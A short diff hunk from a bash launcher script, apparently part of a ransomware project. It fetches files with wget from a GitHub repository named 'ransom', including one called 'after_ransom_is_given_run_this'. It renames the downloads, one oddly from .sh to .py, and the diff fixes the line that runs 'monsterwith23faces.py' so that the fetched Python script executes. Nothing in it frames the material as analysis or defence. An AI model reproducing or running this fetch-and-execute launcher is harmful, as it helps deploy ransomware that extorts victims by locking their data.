@@ -3,4 +3,4 @@ wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_th
 mv monsterwith23faces.py\?raw=true monsterwith23faces.py
 mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.py
 #!/bin/bash
-python monsterwith23faces.py\?raw=true
+python monsterwith23faces.py
